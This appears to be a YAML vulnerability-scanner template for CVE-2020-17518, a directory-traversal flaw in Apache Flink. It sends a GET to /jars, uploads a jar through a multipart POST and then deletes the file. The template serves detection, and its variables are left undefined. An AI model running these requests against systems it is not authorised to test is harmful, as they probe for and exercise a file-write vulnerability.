id: yaml-poc-apache-flink-directory_traversal-CVE-2020-17518
info:
  name: Yaml Poc Apache Flink Directory_Traversal Cve 2020 17518
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-apache-flink-directory_traversal-CVE-2020-17518'
  tags: apache,traversal,cve
  classification:
    cve-id: CVE-2020-17518
  reference:
  - http://www.openwall.com/lists/oss-security/2021/01/05/1
  - https://lists.apache.org/thread.html/r0b000dc028616d33cb9aa388eb45d516b789cab0024dad94bc06588a%40%3Cissues.flink.apache.org%3E
  - https://lists.apache.org/thread.html/r0b000dc028616d33cb9aa388eb45d516b789cab0024dad94bc06588a@%3Cissues.flink.apache.org%3E
  - https://lists.apache.org/thread.html/r1125f3044a0946d1e7e6f125a6170b58d413ebd4a95157e4608041c7%40%3Cannounce.apache.org%3E
  - https://lists.apache.org/thread.html/r1125f3044a0946d1e7e6f125a6170b58d413ebd4a95157e4608041c7@%3Cannounce.apache.org%3E
http:
- method: GET
  path:
  - /jars
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - address
    - files
- method: POST
  path:
  - /jars/upload
  body: "--8ce4b16b22b58894aa86c421e8759df3\r\nContent-Disposition: form-data; name=\"\
    jarfile\";filename=\"{{r2}}.jar\"\r\nContent-Type:application/octet-stream\r\n\
    \r\n{{r1}}\r\n--8ce4b16b22b58894aa86c421e8759df3--\r\n"
  headers:
    Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - success
- method: DELETE
  path:
  - /jars/{{filen}}
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
